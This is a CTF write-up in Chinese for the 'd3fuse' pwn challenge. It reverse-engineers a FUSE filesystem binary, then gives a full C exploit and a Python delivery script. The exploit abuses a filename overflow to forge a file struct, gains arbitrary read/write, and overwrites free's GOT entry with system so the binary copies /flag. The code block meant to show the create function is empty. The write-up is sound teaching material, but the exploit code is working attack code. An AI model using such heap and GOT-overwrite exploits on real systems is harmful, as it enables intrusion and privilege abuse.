
## run

Run the following commands to set up the environment:
1. `docker build -t d3fuse_env .`
2. `docker run -d --rm --privileged -p 9999:9999 d3fuse_env`
2. `nc 127.0.0.1 9999`

## Reverse

逆向时可以参考 [libfuse.github.io](https://libfuse.github.io/doxygen/structfuse__operations.html) ：

先通过 `fuse_main_real` 的第三个参数得到 `struct fuse_operations *op`：

```sh
.data.rel.ro:0000000000404CC0 OP              dq offset get_attr      ; DATA XREF: main+49↑o
.data.rel.ro:0000000000404CC8                 dq 0
.data.rel.ro:0000000000404CD0                 dq 0
.data.rel.ro:0000000000404CD8                 dq offset mkdir
.data.rel.ro:0000000000404CE0                 dq offset unlink
.data.rel.ro:0000000000404CE8                 dq offset rmdir
.data.rel.ro:0000000000404CF0                 dq 0
.data.rel.ro:0000000000404CF8                 dq offset rename
.data.rel.ro:0000000000404D00                 dq 0
.data.rel.ro:0000000000404D08                 dq 0
.data.rel.ro:0000000000404D10                 dq 0
.data.rel.ro:0000000000404D18                 dq offset truncate
.data.rel.ro:0000000000404D20                 dq offset open
.data.rel.ro:0000000000404D28                 dq offset read
.data.rel.ro:0000000000404D30                 dq offset write
.data.rel.ro:0000000000404D38                 dq 0
.data.rel.ro:0000000000404D40                 dq offset flush
.data.rel.ro:0000000000404D48                 dq offset release
.data.rel.ro:0000000000404D50                 dq 0
.data.rel.ro:0000000000404D58                 dq 0
.data.rel.ro:0000000000404D60                 dq 0
.data.rel.ro:0000000000404D68                 dq 0
.data.rel.ro:0000000000404D70                 dq 0
.data.rel.ro:0000000000404D78                 dq offset opendir
.data.rel.ro:0000000000404D80                 dq offset readdir
.data.rel.ro:0000000000404D88                 dq offset releasedir
.data.rel.ro:0000000000404D90                 dq 0
.data.rel.ro:0000000000404D98                 dq offset fuse_init
.data.rel.ro:0000000000404DA0                 dq offset destort
.data.rel.ro:0000000000404DA8                 dq offset access
.data.rel.ro:0000000000404DB0                 dq offset create
...
```

进到上面的几个函数中进行分析，得到文件结构体：

```sh
00000000 file            struc ; (sizeof=0x30, mappedto_8)
00000000 name            db 32 dup(?)
00000020 type            dd ?
00000024 size            dd ?
00000028 ptr             dq ?
00000030 file            ends
```

这时候可以发现文件名是直接储存在结构体中的，这时候就猜测有字符串相关操作导致的溢出了，进到 `create` 函数中验证了上面的猜测：

```c
```

## Exploit

说到底 fuse 也是一个 elf 文件，这里可以拿菜单题的视角来看这道题，保护如下：

```sh
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

`no-pie` 加上 `Partial RELRO`，是一个相当好利用的情况。

于是思路逐渐明确如下：

-   先打开一个文件用于后续伪造
-   伪造 file 结构体并将 ptr 域改为 `elf.got['free']` 并写入到之前打开的文件中
-   利用溢出将打开的文件类型设置为目录，于是就能通过上面伪造的文件的 ptr 域进行任意读写了
-   最终由 d3fuse 调用 `system("cp /flag /chroot/rwdir")` 才能读到 flag

于是编写 exp.c 如下：

```c
// exploition for d3fuse
// by @eastXueLian
// compiled with: musl-gcc -w -static -o exp.bin exp.c

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

struct file_struct {
    char name[0x20];
    int file_type;
    int file_size;
    char *cont_ptr;
};

int main() {
    char buf[0x200];
    struct file_struct fake_file;
    
    // prepare shellcode
    system("echo \"cp /flag /chroot/rwdir\" > /mnt/cmd");

    // corrupted file
    int corrupted_fd = open("/mnt/corrupted_file", O_RDWR|O_CREAT, 0777);

    // construct fake file
    strcpy(fake_file.name, "fake_file");
    fake_file.file_type = 0;        // file
    fake_file.file_size = 0x200;
    fake_file.cont_ptr = 0x405018;       // elf.got['free']
    
    // write fake data into the data of corrupted_fd
    memcpy(buf, &fake_file, sizeof(struct file_struct));
    memcpy(buf + sizeof(struct file_struct), &fake_file, sizeof(struct file_struct));
    write(corrupted_fd, &fake_file, 2 * sizeof(struct file_struct));
    close(corrupted_fd);

    // trigger vulnablities
    system("mv /mnt/corrupted_file /mnt/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1");
    sleep(1);

    // now we have arbitary read/write
    int rw_fd = open("/mnt/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1/fake_file", O_RDWR, 0777);
    printf("%d\n", rw_fd);
    read(rw_fd, buf, 8);
    size_t system_addr = ((size_t*)buf)[0]-0x48440;
	((size_t *)buf)[0] = system_addr;
    printf("%llx\n", system_addr);

    // open it again to write
    rw_fd = open("/mnt/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1/fake_file", O_RDWR, 0777);
    write(rw_fd, buf, 8);

    sleep(1);
    
    // call free
    system("mv /mnt/cmd /mnt/anotherfile");

    return 0;
}
```

在本地起一个 docker，运行 `./exp.py remote 127.0.0.1:9999 -nl` 验证思路成功：

```python
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Remote: ./exp.py remote ./pwn ip:port

import subprocess
from base64 import b64encode, b64decode
from pwncli import *
cli_script()

io: tube = gift.io

lg_inf = lambda s : print('\033[1m\033[33m[*] %s\033[0m' % (s))
lg_err = lambda s : print('\033[1m\033[31m[x] %s\033[0m' % (s))
lg_suc = lambda s : print('\033[1m\033[32m[+] %s\033[0m' % (s))
commands = []

lg_inf("compiling exp.c")
if subprocess.run("musl-gcc -static -o exp.bin exp.c", shell=True).returncode:
    lg_err("compile error")
lg_suc("compile finished")

exp_data_list = []
SPLIT_LENGTH = 0x100
with open("./exp.bin", "rb") as f_exp:
    exp_data = b64encode( f_exp.read() ).decode()
lg_inf("Data length: " + str(len(exp_data)))
for i in range(len(exp_data) // SPLIT_LENGTH):
    exp_data_list.append( exp_data[i*SPLIT_LENGTH:(i+1)*SPLIT_LENGTH] )
if not len(exp_data)%SPLIT_LENGTH:
    exp_data_list.append( exp_data[(len(exp_data)//SPLIT_LENGTH):] )


commands.append("cd rwdir; touch ./exp.b64")
for i in exp_data_list:
    commands.append("echo -n '" + i + "'>> ./exp.b64")
commands.append("base64 -d ./exp.b64 > ./exp; chmod +x ./exp; ./exp")
commands.append("cat ./flag")

for i in commands:
    sl(i)

lg_suc(str(len(commands)) + " commands sent.")
ia()
```
